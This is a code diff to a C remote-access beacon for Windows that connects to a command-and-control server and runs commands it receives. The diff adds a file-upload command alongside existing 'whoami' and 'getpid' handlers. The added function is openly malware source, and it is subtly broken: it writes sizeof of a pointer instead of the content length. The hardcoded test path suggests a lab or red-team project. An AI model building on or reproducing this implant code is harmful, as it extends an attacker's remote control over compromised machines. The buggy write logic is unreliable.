@@ -185,6 +185,25 @@ DWORD getpid(){
 	return pid;
 }
 
+#define B64_FILE_ERROR          2
+
+int upload(char * filename, char * content){
+	// Upload contents to a file
+	int retcode = B64_FILE_ERROR;
+	FILE *outfile;
+	outfile = fopen(filename, "wb");
+	if (!outfile) {
+		printf("[upload] [DBG] Error opening file...");
+		return retcode;
+	}
+	else {
+		printf("[upload] [DBG] File %s opened. Trying to write there...", filename);
+		fwrite(content,sizeof(content),1,outfile);
+		fclose(outfile);
+		return 0;
+	}
+}
+
 void whoami(char* returnval)
 {
 	DWORD bufferlen = 257;
@@ -319,6 +338,12 @@ void StartBeacon(char* C2Server, int C2Port)
 
 			// Command parsed as whoami (strpcmp makes comparsion with predefined string in this case)
 			if (strcmp(RecvData, "\n") == 0) { memset(RecvData, 0, sizeof(RecvData)); }
+			else if (strcmp(RecvData, "upload\n") == 0) {
+				char * file = "C:\\Users\\IEUser\\Desktop\\test";
+				char * contents = "testing";
+				printf(" [beacon] [DBG] Uploading %s into %s",contents,file);
+				upload(file,contents);
+			}
 			else if (strcmp(RecvData, "getpid\n") == 0) {
 				DWORD pid;
 				char cpid[6];
